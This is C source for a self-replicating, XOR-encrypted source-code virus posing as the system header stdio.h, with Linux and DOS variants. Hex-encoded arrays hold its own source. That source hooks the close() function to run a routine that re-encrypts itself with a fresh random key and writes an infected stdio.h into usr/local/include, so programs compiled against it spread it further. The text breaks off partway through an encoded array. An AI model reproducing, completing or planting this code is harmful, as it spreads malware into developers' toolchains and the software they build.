#include "/usr/include/stdio.h"
#include <fcntl.h>
#ifdef linux
#	include <linux/unistd.h>
#else
#	include <dos.h>
#endif

#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

int virfunc(void);
int Close(int);
int Crypt(char*, int);
int mutate(char *);
#ifdef linux
  int jump2dos(void);
#endif
  
#define CHARS 4883
#define CHARS2 367

char B[] = 
"\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x22\x2f\x75\x73\x72"
"\x2f\x69\x6e\x63\x6c\x75\x64\x65\x2f\x73\x74\x64\x69\x6f\x2e"
"\x68\x22\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x66\x63"
"\x6e\x74\x6c\x2e\x68\x3e\x0a\x23\x69\x66\x64\x65\x66\x20\x6c"
"\x69\x6e\x75\x78\x0a\x23\x09\x69\x6e\x63\x6c\x75\x64\x65\x20"
"\x3c\x6c\x69\x6e\x75\x78\x2f\x75\x6e\x69\x73\x74\x64\x2e\x68"
"\x3e\x0a\x23\x65\x6c\x73\x65\x0a\x23\x09\x69\x6e\x63\x6c\x75"
"\x64\x65\x20\x3c\x64\x6f\x73\x2e\x68\x3e\x0a\x23\x65\x6e\x64"
"\x69\x66\x0a\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73"
"\x79\x73\x2f\x73\x74\x61\x74\x2e\x68\x3e\x0a\x23\x69\x6e\x63"
"\x6c\x75\x64\x65\x20\x3c\x65\x72\x72\x6e\x6f\x2e\x68\x3e\x0a"
"\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x75\x6e\x69\x73\x74"
"\x64\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c"
"\x73\x74\x72\x69\x6e\x67\x2e\x68\x3e\x0a\x0a\x69\x6e\x74\x20"
"\x76\x69\x72\x66\x75\x6e\x63\x28\x76\x6f\x69\x64\x29\x3b\x0a"
"\x69\x6e\x74\x20\x43\x6c\x6f\x73\x65\x28\x69\x6e\x74\x29\x3b"
"\x0a\x69\x6e\x74\x20\x43\x72\x79\x70\x74\x28\x63\x68\x61\x72"
"\x2a\x2c\x20\x69\x6e\x74\x29\x3b\x0a\x69\x6e\x74\x20\x6d\x75"
"\x74\x61\x74\x65\x28\x63\x68\x61\x72\x20\x2a\x29\x3b\x0a\x23"
"\x69\x66\x64\x65\x66\x20\x6c\x69\x6e\x75\x78\x0a\x20\x20\x69"
"\x6e\x74\x20\x6a\x75\x6d\x70\x32\x64\x6f\x73\x28\x76\x6f\x69"
"\x64\x29\x3b\x0a\x23\x65\x6e\x64\x69\x66\x0a\x20\x20\x0a\x23"
"\x64\x65\x66\x69\x6e\x65\x20\x43\x48\x41\x52\x53\x20\x34\x38"
"\x38\x33\x0a\x23\x64\x65\x66\x69\x6e\x65\x20\x43\x48\x41\x52"
"\x53\x32\x20\x33\x36\x37\x0a\x0a";

char C[] = 
"\x2f\x2a\x20\x74\x68\x65\x20\x68\x6f\x6f\x6b\x65\x64\x20"
"\x63\x6c\x6f\x73\x65\x2d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20"
"\x2a\x2f\x0a\x69\x6e\x74\x20\x63\x6c\x6f\x73\x65\x28\x69\x6e"
"\x74\x20\x66\x64\x29\x20\x0a\x7b\x0a\x20\x20\x20\x09\x73\x74"
"\x61\x74\x69\x63\x20\x69\x6e\x74\x20\x66\x69\x72\x73\x74\x20"
"\x3d\x20\x30\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66"
"\x20\x28\x21\x66\x69\x72\x73\x74\x29\x20\x7b\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x09\x66\x69\x72\x73\x74\x2b"
"\x2b\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09"
"\x63\x68\x64\x69\x72\x28\x22\x2f\x22\x29\x3b\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x76\x69"
"\x72\x66\x75\x6e\x63\x28\x29\x3b\x0a\x23\x69\x66\x64\x65\x66"
"\x20\x6c\x69\x6e\x75\x78\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x75\x6d\x70\x32\x64\x6f"
"\x73\x28\x29\x3b\x0a\x23\x65\x6e\x64\x69\x66\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x72\x65\x74\x75\x72\x6e\x20\x43\x6c\x6f\x73\x65\x28\x66\x64"
"\x29\x3b\x0a\x7d\x0a\x0a\x2f\x2a\x20\x74\x68\x65\x20\x72\x65"
"\x61\x6c\x20\x63\x6c\x6f\x73\x65\x2d\x66\x75\x6e\x63\x74\x69"
"\x6f\x6e\x73\x2c\x20\x75\x73\x69\x6e\x67\x20\x74\x68\x65\x20"
"\x73\x79\x73\x63\x61\x6c\x6c\x73\x20\x2a\x2f\x0a\x23\x69\x66"
"\x64\x65\x66\x20\x6c\x69\x6e\x75\x78\x0a\x69\x6e\x74\x20\x43"
"\x6c\x6f\x73\x65\x28\x69\x6e\x74\x20\x69\x29\x0a\x7b\x0a\x20"
"\x20\x20\x09\x6c\x6f\x6e\x67\x20\x5f\x5f\x72\x65\x73\x3b\x0a"
"\x20\x0a\x20\x20\x20\x20\x09\x65\x72\x72\x6e\x6f\x20\x3d\x20"
"\x30\x3b\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20"
"\x20\x20\x20\x5f\x5f\x61\x73\x6d\x5f\x5f\x20\x76\x6f\x6c\x61"
"\x74\x69\x6c\x65\x20\x28\x22\x69\x6e\x74\x20\x24\x30\x78\x38"
"\x30\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x09\x3a\x20\x22\x3d\x61\x22\x20\x28\x5f\x5f"
"\x72\x65\x73\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3a"
"\x20\x22\x30\x22\x20\x28\x5f\x5f\x4e\x52\x5f\x63\x6c\x6f\x73"
"\x65\x29\x2c\x22\x62\x22\x20\x28\x28\x6c\x6f\x6e\x67\x29\x28"
"\x69\x29\x29\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x69\x66\x20\x28\x5f\x5f\x72\x65\x73\x20\x3e\x3d\x20\x30\x29"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x72"
"\x65\x74\x75\x72\x6e\x20\x28\x69\x6e\x74\x29\x5f\x5f\x72\x65"
"\x73\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x72\x72"
"\x6e\x6f\x20\x3d\x20\x2d\x5f\x5f\x72\x65\x73\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x2d"
"\x31\x3b\x0a\x7d\x0a\x23\x65\x6c\x73\x65\x0a\x69\x6e\x74\x20"
"\x43\x6c\x6f\x73\x65\x28\x69\x6e\x74\x20\x69\x29\x20\x0a\x7b"
"\x0a\x20\x20\x20\x09\x75\x6e\x69\x6f\x6e\x20\x52\x45\x47\x53"
"\x20\x69\x72\x2c\x20\x6f\x72\x3b\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x65\x72\x72\x6e"
"\x6f\x20\x3d\x20\x30\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x69\x72\x2e\x68\x2e\x61\x68\x20\x3d\x20\x30\x78\x33\x65\x3b"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x72\x2e\x78\x2e\x62"
"\x78\x20\x3d\x20\x69\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x6d\x65\x6d\x73\x65\x74\x28\x26\x6f\x72\x2c\x20\x30\x2c\x20"
"\x73\x69\x7a\x65\x6f\x66\x28\x6f\x72\x29\x29\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x69\x6e\x74\x38\x36\x28\x30\x78\x32"
"\x31\x2c\x20\x26\x69\x72\x2c\x20\x26\x6f\x72\x29\x3b\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x6f\x72\x2e\x78"
"\x2e\x63\x66\x6c\x61\x67\x29\x20\x7b\x0a\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x09\x65\x72\x72\x6e\x6f\x20\x3d\x20"
"\x6f\x72\x2e\x78\x2e\x61\x78\x3b\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72"
"\x6e\x20\x2d\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e"
"\x20\x30\x3b\x0a\x7d\x0a\x23\x65\x6e\x64\x69\x66\x0a\x0a\x69"
"\x6e\x74\x20\x76\x69\x72\x66\x75\x6e\x63\x28\x76\x6f\x69\x64"
"\x29\x0a\x7b\x0a\x20\x20\x20\x09\x46\x49\x4c\x45\x20\x2a\x66"
"\x64\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x6e\x74\x20"
"\x69\x20\x3d\x20\x30\x2c\x20\x6a\x20\x3d\x20\x31\x3b\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x0a\x23\x69\x66\x64\x65\x66\x20"
"\x6c\x69\x6e\x75\x78\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x69\x6e\x74\x20\x6f\x6c\x64\x6d"
"\x61\x73\x6b\x20\x3d\x20\x75\x6d\x61\x73\x6b\x28\x30\x29\x3b"
"\x0a\x23\x65\x6e\x64\x69\x66\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x2f\x2a\x20\x64\x65\x63\x72\x79\x70\x74\x20\x74\x68\x65"
"\x20\x61\x72\x72\x61\x79\x73\x20\x66\x69\x72\x73\x74\x20\x5b"
"\x77\x65\x20\x61\x73\x73\x75\x6d\x65\x20\x74\x68\x61\x74\x20"
"\x69\x74\x20\x69\x73\x20\x65\x6e\x63\x72\x79\x70\x74\x65\x64"
"\x20\x21\x21\x21\x5d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x2a\x20\x6c\x6f\x6f\x6b\x20\x61\x74\x20\x74\x68\x65\x20\x65"
"\x6e\x64\x20\x6f\x66\x20\x76\x69\x72\x66\x75\x6e\x63\x28\x29"
"\x20\x74\x6f\x6f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2a"
"\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x43\x72\x79\x70\x74"
"\x28\x42\x2c\x20\x43\x48\x41\x52\x53\x32\x29\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x43\x72\x79\x70\x74\x28\x43\x2c\x20"
"\x43\x48\x41\x52\x53\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x2f\x2a\x20\x67\x65\x74\x20\x61\x20\x64\x69\x66\x66\x65"
"\x72\x65\x6e\x74\x20\x6b\x65\x79\x20\x66\x6f\x72\x20\x6e\x65"
"\x77\x20\x65\x6e\x63\x72\x79\x70\x74\x69\x6f\x6e\x20\x2a\x2f"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x75\x74\x61\x74\x65"
"\x28\x6b\x65\x79\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x2f\x2a\x20\x6f\x70\x65\x6e\x20\x61\x20\x66\x69\x6c\x65\x20"
"\x73\x74\x64\x69\x6f\x2e\x68\x20\x69\x6e\x20\x2f\x75\x73\x72"
"\x2f\x6c\x6f\x63\x61\x6c\x2f\x69\x6e\x63\x6c\x75\x64\x65\x20"
"\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x6b\x64\x69"
"\x72\x28\x22\x75\x73\x72\x2f\x6c\x6f\x63\x61\x6c\x22\x2c\x20"
"\x30\x37\x35\x35\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x6d\x6b\x64\x69\x72\x28\x22\x75\x73\x72\x2f\x6c\x6f\x63\x61"
"\x6c\x2f\x69\x6e\x63\x6c\x75\x64\x65\x22\x2c\x20\x30\x37\x35"
"\x35\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x75\x6e\x6c"
"\x69\x6e\x6b\x28\x22\x75\x73\x72\x2f\x6c\x6f\x63\x61\x6c\x2f"
"\x69\x6e\x63\x6c\x75\x64\x65\x2f\x73\x74\x64\x69\x6f\x2e\x68"
"\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20"
"\x28\x28\x66\x64\x20\x3d\x20\x66\x64\x6f\x70\x65\x6e\x28\x6f"
"\x70\x65\x6e\x28\x22\x75\x73\x72\x2f\x6c\x6f\x63\x61\x6c\x2f"
"\x69\x6e\x63\x6c\x75\x64\x65\x2f\x73\x74\x64\x69\x6f\x2e\x68"
"\x22\x2c\x20\x4f\x5f\x43\x52\x45\x41\x54\x7c\x4f\x5f\x52\x44"
"\x57\x52\x2c\x20\x30\x36\x34\x34\x29\x2c\x20\x22\x77\x2b\x22"
"\x29\x29\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\x29\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x09\x70\x65\x72\x72\x6f\x72"
"\x28\x22\x66\x6f\x70\x65\x6e\x22\x29\x3b\x0a\x20\x20\x20\x20"
"\x20\x20\x20\x20\x2f\x2a\x20\x77\x72\x69\x74\x65\x20\x68\x65"
"\x61\x64\x20\x69\x6e\x20\x69\x74\x20\x28\x6e\x6f\x77\x20\x70"
"\x6c\x61\x69\x6e\x29\x20\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x66\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20\x22"
"\x25\x73\x22\x2c\x20\x42\x29\x3b\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x2f\x2a\x20\x65\x6e\x63\x72\x79\x70\x74\x20\x61\x72"
"\x72\x61\x79\x20\x42\x20\x77\x69\x74\x68\x20\x6e\x65\x77\x20"
"\x6b\x65\x79\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x43"
"\x72\x79\x70\x74\x28\x42\x2c\x20\x43\x48\x41\x52\x53\x32\x29"
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x20\x61\x6e"
"\x64\x20\x77\x72\x69\x74\x65\x20\x69\x74\x20\x65\x6e\x63\x72"
"\x79\x70\x74\x65\x64\x20\x74\x6f\x20\x74\x68\x65\x20\x66\x69"
"\x6c\x65\x20\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66"
"\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20\x22\x63\x68\x61"
"\x72\x20\x42\x5b\x5d\x20\x3d\x20\x5c\x6e\x5c\x22\x22\x29\x3b"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66\x6f\x72\x20\x28\x69"
"\x20\x3d\x20\x30\x3b\x20\x69\x20\x3c\x20\x43\x48\x41\x52\x53"
"\x32\x3b\x20\x69\x2b\x2b\x29\x20\x7b\x0a\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x09\x69\x66\x20\x28\x28\x6a\x20\x25"
"\x20\x31\x35\x29\x20\x3d\x3d\x20\x30\x29\x20\x7b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x09\x66\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20"
"\x22\x5c\x22\x5c\x6e\x5c\x22\x22\x29\x3b\x0a\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x6a\x20\x3d\x20\x30\x3b\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x66\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20\x22\x5c"
"\x5c\x78\x25\x30\x32\x78\x22\x2c\x20\x28\x75\x6e\x73\x69\x67"
"\x6e\x65\x64\x20\x63\x68\x61\x72\x29\x42\x5b\x69\x5d\x29\x3b"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x6a\x2b\x2b\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
"\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66\x70\x72\x69\x6e"
"\x74\x66\x28\x66\x64\x2c\x20\x22\x5c\x22\x3b\x5c\x6e\x5c\x6e"
"\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x20"
"\x65\x6e\x63\x72\x79\x70\x74\x20\x43\x20\x77\x69\x74\x68\x20"
"\x74\x68\x65\x20\x6e\x65\x77\x20\x6b\x65\x79\x20\x2a\x2f\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x66\x70\x72\x69\x6e\x74\x66"
"\x28\x66\x64\x2c\x20\x22\x63\x68\x61\x72\x20\x43\x5b\x5d\x20"
"\x3d\x20\x5c\x6e\x5c\x22\x22\x29\x3b\x0a\x20\x20\x20\x20\x20"
"\x20\x20\x20\x43\x72\x79\x70\x74\x28\x43\x2c\x20\x43\x48\x41"
"\x52\x53\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a"
"\x20\x61\x6e\x64\x20\x77\x72\x69\x74\x65\x20\x69\x74\x20\x74"
"\x6f\x20\x61\x6c\x73\x6f\x20\x74\x68\x65\x20\x66\x69\x6c\x65"
"\x20\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66\x6f\x72"
"\x20\x28\x69\x20\x3d\x20\x30\x3b\x20\x69\x20\x3c\x20\x43\x48"
"\x41\x52\x53\x3b\x20\x69\x2b\x2b\x29\x20\x7b\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x09\x69\x66\x20\x28\x28\x6a"
"\x20\x25\x20\x31\x35\x29\x20\x3d\x3d\x20\x30\x29\x20\x7b\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x09\x66\x70\x72\x69\x6e\x74\x66\x28\x66\x64"
"\x2c\x20\x22\x5c\x22\x5c\x6e\x5c\x22\x22\x29\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x6a\x20\x3d\x20\x30\x3b\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x66"
"\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20\x22\x5c\x5c\x78"
"\x25\x30\x32\x78\x22\x2c\x20\x28\x75\x6e\x73\x69\x67\x6e\x65"
"\x64\x20\x63\x68\x61\x72\x29\x43\x5b\x69\x5d\x29\x3b\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x6a\x2b\x2b\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x66\x70\x72\x69\x6e\x74\x66"
"\x28\x66\x64\x2c\x20\x22\x5c\x22\x3b\x5c\x6e\x5c\x6e\x22\x29"
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x20\x70\x75"
"\x74\x20\x74\x68\x65\x20\x6e\x65\x77\x20\x6b\x65\x79\x20\x77"
"\x65\x20\x67\x6f\x74\x20\x74\x6f\x20\x74\x68\x65\x20\x66\x69"
"\x6c\x65\x20\x77\x69\x63\x68\x20\x69\x73\x20\x75\x73\x65\x64"
"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2a\x20\x66\x6f\x72"
"\x20\x74\x68\x65\x20\x6e\x65\x78\x74\x20\x64\x65\x63\x72\x79"
"\x70\x74\x69\x6f\x6e\x20\x61\x74\x20\x74\x68\x65\x20\x6e\x65"
"\x78\x74\x20\x63\x61\x6c\x6c\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x2a\x2f\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66"
"\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20\x22\x5c\x6e\x5c"
"\x6e\x75\x6e\x73\x69\x67\x6e\x65\x64\x20\x63\x68\x61\x72\x20"
"\x6b\x65\x79\x5b\x34\x5d\x20\x3d\x20\x7b\x30\x78\x25\x30\x32"
"\x78\x2c\x20\x30\x78\x25\x30\x32\x78\x2c\x20\x30\x78\x25\x30"
"\x32\x78\x2c\x20\x30\x78\x25\x30\x32\x78\x7d\x3b\x5c\x6e\x5c"
"\x6e\x22\x2c\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x28\x75\x6e\x73"
"\x69\x67\x6e\x65\x64\x20\x63\x68\x61\x72\x29\x6b\x65\x79\x5b"
"\x30\x5d\x2c\x20\x28\x75\x6e\x73\x69\x67\x6e\x65\x64\x20\x63"
"\x68\x61\x72\x29\x6b\x65\x79\x5b\x31\x5d\x2c\x20\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x28\x75\x6e\x73\x69\x67\x6e\x65\x64\x20\x63"
"\x68\x61\x72\x29\x6b\x65\x79\x5b\x32\x5d\x2c\x20\x28\x75\x6e"
"\x73\x69\x67\x6e\x65\x64\x20\x63\x68\x61\x72\x29\x6b\x65\x79"
"\x5b\x33\x5d\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f"
"\x2a\x20\x67\x65\x74\x20\x43\x20\x70\x6c\x61\x69\x6e\x20\x2a"
"\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x43\x72\x79\x70\x74"
"\x28\x43\x2c\x20\x43\x48\x41\x52\x53\x29\x3b\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x2f\x2a\x20\x61\x6e\x64\x20\x61\x70\x70"
"\x65\x6e\x64\x20\x69\x74\x20\x74\x6f\x20\x73\x74\x64\x69\x6f"
"\x2e\x68\x20\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66"
"\x70\x72\x69\x6e\x74\x66\x28\x66\x64\x2c\x20\x22\x25\x73\x22"
"\x2c\x20\x43\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66"
"\x63\x6c\x6f\x73\x65\x28\x66\x64\x29\x3b\x0a\x23\x69\x66\x64"
"\x65\x66\x20\x6c\x69\x6e\x75\x78\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x75\x6d\x61\x73\x6b\x28\x6f\x6c\x64\x6d\x61\x73\x6b"
"\x29\x3b\x0a\x23\x65\x6e\x64\x69\x66\x0a\x20\x20\x20\x20\x20"
"\x20\x20\x20\x43\x72\x79\x70\x74\x28\x43\x2c\x20\x43\x48\x41"
"\x52\x53\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a"
"\x20\x72\x65\x73\x75\x6c\x74\x3a\x20\x42\x20\x61\x6e\x64\x20"
"\x43\x20\x69\x73\x20\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x20"
"\x6e\x6f\x77\x20\x2d\x3e\x20\x77\x65\x20\x63\x61\x6e\x20\x63"
"\x61\x6c\x6c\x20\x76\x69\x72\x66\x75\x6e\x63\x28\x29\x20\x61"
"\x67\x61\x69\x6e\x20\x2a\x2f\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x7d\x0a\x0a\x2f"
"\x2a\x20\x73\x69\x6d\x70\x6c\x65\x20\x58\x4f\x52\x2d\x65\x6e"
"\x63\x72\x79\x70\x74\x69\x6f\x6e\x20\x74\x65\x63\x68\x6e\x69"
"\x71\x75\x65\x20\x75\x73\x69\x6e\x67\x20\x74\x68\x65\x20\x67"
"\x6c\x6f\x62\x61\x6c\x20\x6b\x65\x79\x5b\x5d\x20\x66\x6f\x72"
"\x0a\x20\x2a\x20\x69\x74\x0a\x20\x2a\x2f\x0a\x0a\x69\x6e\x74"
"\x20\x43\x72\x79\x70\x74\x28\x63\x68\x61\x72\x20\x2a\x73\x2c"
"\x20\x69\x6e\x74\x20\x6c\x65\x6e\x29\x0a\x7b\x0a\x20\x20\x20"
"\x09\x69\x6e\x74\x20\x69\x20\x3d\x20\x30\x2c\x20\x6a\x20\x3d"
"\x20\x30\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x66\x6f\x72\x20\x28\x69\x20\x3d\x20"
"\x30\x3b\x20\x69\x20\x3c\x20\x6c\x65\x6e\x3b\x20\x69\x2b\x2b"
"\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x09\x73\x5b\x69\x5d\x20\x5e\x3d\x20\x6b\x65\x79\x5b\x6a\x5d"
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x6a\x20\x3d\x20\x28\x6a\x20\x2b\x20\x31\x29\x20"
"\x25\x20\x34\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20"
"\x30\x3b\x0a\x7d\x0a\x0a\x2f\x2a\x20\x6f\x6e\x20\x6c\x69\x6e"
"\x75\x78\x20\x77\x65\x20\x75\x73\x65\x20\x2f\x64\x65\x76\x2f"
"\x72\x61\x6e\x64\x6f\x6d\x2c\x20\x6f\x6e\x20\x44\x4f\x53\x20"
"\x77\x65\x20\x75\x73\x65\x20\x72\x6e\x64\x28\x29\x20\x2a\x2f"
"\x0a\x0a\x69\x6e\x74\x20\x6d\x75\x74\x61\x74\x65\x28\x63\x68"
"\x61\x72\x20\x2a\x73\x29\x0a\x7b\x0a\x20\x20\x20\x09\x69\x6e"
"\x74\x20\x69\x3b\x0a\x23\x69\x66\x64\x65\x66\x20\x6c\x69\x6e"
"\x75\x78\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x6e\x74\x20"
"\x66\x64\x3b\x0a\x23\x65\x6e\x64\x69\x66\x20\x20\x20\x0a\x23"
"\x69\x66\x64\x65\x66\x20\x4d\x53\x44\x4f\x53\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x72\x61\x6e\x64\x6f\x6d\x28\x29\x3b\x0a"
"\x23\x65\x6e\x64\x69\x66\x20\x20\x20\x20\x20\x20\x20\x20\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x66\x6f\x72\x20\x28\x69\x20"
"\x3d\x20\x30\x3b\x20\x69\x20\x3c\x20\x34\x3b\x20\x69\x2b\x2b"
"\x29\x20\x7b\x0a\x23\x69\x66\x64\x65\x66\x20\x6c\x69\x6e\x75"
"\x78\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x69"
"\x66\x20\x28\x28\x66\x64\x20\x3d\x20\x6f\x70\x65\x6e\x28\x22"
"\x2f\x64\x65\x76\x2f\x72\x61\x6e\x64\x6f\x6d\x22\x2c\x20\x4f"
"\x5f\x52\x44\x4f\x4e\x4c\x59\x29\x29\x20\x3c\x3d\x20\x30\x29"
"\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x09\x70\x65\x72\x72\x6f\x72\x28"
"\x22\x6f\x70\x65\x6e\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x65\x72\x72\x6e\x6f"
"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x72\x65\x61\x64\x28\x66\x64\x2c\x20"
